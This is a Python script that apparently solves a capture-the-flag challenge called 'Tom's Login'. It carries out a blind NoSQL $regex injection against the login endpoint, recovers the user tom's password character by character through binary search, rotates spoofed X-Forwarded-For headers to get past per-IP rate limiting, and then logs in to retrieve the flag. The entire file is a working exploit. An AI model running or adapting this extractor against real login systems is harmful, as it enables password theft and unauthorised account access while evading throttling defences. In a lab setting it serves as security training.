#!/usr/bin/env python3
"""
Tom's Login — SEQUENTIAL blind NoSQL ($regex) extractor.

Why sequential: the target throttles CONCURRENT requests per real source IP
(returns HTTP 200 pages with no 'Database Documents' line once >1 request is in
flight). X-Forwarded-For rotation defeats the per-IP RATE limit but NOT the
concurrency cap, so parallelism makes things slower. One persistent keep-alive
connection, one request at a time, is the fast path here.

Boolean oracle => ~6 requests/char (binary search) is the floor; for an N-char
password expect ~6*(N+1) requests. Wall-clock is then just that times the
server's per-request latency.
"""
import os, re, sys, time, random, string
from urllib.parse import quote
import requests
from requests.adapters import HTTPAdapter

BASE    = "https://0becfa19d485ac808817f9ab617c2061-toms-login.web.cityinthe.cloud"
LOGIN   = BASE + "/login"
USER    = "tom"
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits  # specials sanitized
DOC     = re.compile(r"Documents\s*:\s*(\d+)", re.I)
FLAG    = re.compile(r"(?:flag|ncl)\{[^}]+\}|FLAG-[A-Za-z0-9_-]+", re.I)
MAXLEN  = 64
VERBOSE = int(os.environ.get("VERBOSE", "1"))

session = requests.Session()                       # ONE reused keep-alive connection
session.mount("https://", HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=0))
reqs = 0
_t0 = time.time()

def say(level, msg):
    if VERBOSE >= level:
        print(f"[+{time.time() - _t0:6.1f}s] {msg}", flush=True)

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def oracle(regex: str) -> bool:
    """True iff {username:tom, password:{$regex:regex}} matches tom (Documents >= 1)."""
    global reqs
    url = f"{LOGIN}?username={USER}&password[$regex]={quote(regex, safe='')}"
    bad = 0
    while True:
        reqs += 1; n = reqs
        try:
            r = session.get(url, headers={"X-Forwarded-For": rand_ip()}, timeout=20)
        except requests.RequestException as e:
            bad += 1
            say(1, f"    req#{n:<4} neterr {e.__class__.__name__}; retry {bad}")
            if bad >= 6:
                raise RuntimeError(f"network/TLS error (check BASE host/cert): {e}") from e
            time.sleep(0.4 * bad); continue
        if r.status_code == 429:
            bad += 1
            say(1, f"    req#{n:<4} 429; backoff")
            if bad >= 30:
                raise RuntimeError("stuck on HTTP 429")
            time.sleep(1.0 + random.random()); continue
        m = DOC.search(r.text)
        if m is None:
            # sequential should stay clean; a flood here means the box throttles
            # even single-connection — report rather than silently guess.
            bad += 1
            say(1, f"    req#{n:<4} http={r.status_code} no 'Documents' marker; retry {bad}")
            if bad >= 12:
                raise RuntimeError("repeated no-'Documents' responses even sequentially — target/throttle changed")
            time.sleep(0.5 + random.random()); continue
        res = int(m.group(1)) >= 1
        say(2, f"    req#{n:<4} docs={m.group(1)} -> {'MATCH' if res else 'no   '} {regex!r}")
        return res

def find_length() -> int:
    say(1, "--- length probe (^.{0,n}$) ---")
    if not oracle(f"^.{{0,{MAXLEN}}}$"):
        raise RuntimeError(f"password longer than MAXLEN={MAXLEN}")
    lo, hi = 0, MAXLEN
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"^.{{0,{mid}}}$"): hi = mid
        else:                         lo = mid + 1
    say(1, f"--- length = {lo} ---")
    return lo

def next_char(prefix: str) -> str:
    lo, hi = 0, len(CHARSET) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        cls = CHARSET[lo:mid + 1]
        if oracle(f"^{prefix}[{cls}]"): hi = mid
        else:                           lo = mid + 1
    return CHARSET[lo]

def main():
    say(0, f"### solve_seq.py ###  target={BASE}")
    if not (oracle(".*") and not oracle("^zzNOMATCH$")):
        say(0, "[!] oracle sanity failed — injection not firing?"); sys.exit(2)
    say(1, "[ok] oracle live (.* matches, ^zzNOMATCH$ does not)")

    n = find_length()
    pw = ""
    while len(pw) < n:
        pw += next_char(pw)
        say(1, f"[{len(pw):2}/{n}] {pw}")

    if not oracle(f"^{pw}$"):
        say(0, f"[!] exact-match verify FAILED (got '{pw}')"); sys.exit(1)

    dt = time.time() - _t0
    say(0, "")
    say(0, f"[+] PASSWORD = {pw}")
    say(0, f"[+] {reqs} requests in {dt:.1f}s  ({reqs / dt:.1f} req/s)")

    say(1, "--- plaintext login (no operators) ---")
    r = session.get(f"{LOGIN}?username={USER}&password={quote(pw, safe='')}",
                    headers={"X-Forwarded-For": rand_ip()})
    say(0, f"[+] login HTTP {r.status_code}")
    f = FLAG.search(r.text)
    say(0, f"[+] FLAG: {f.group(0)}" if f else "[*] no flag pattern found; full response:\n" + r.text)

if __name__ == "__main__":
    main()
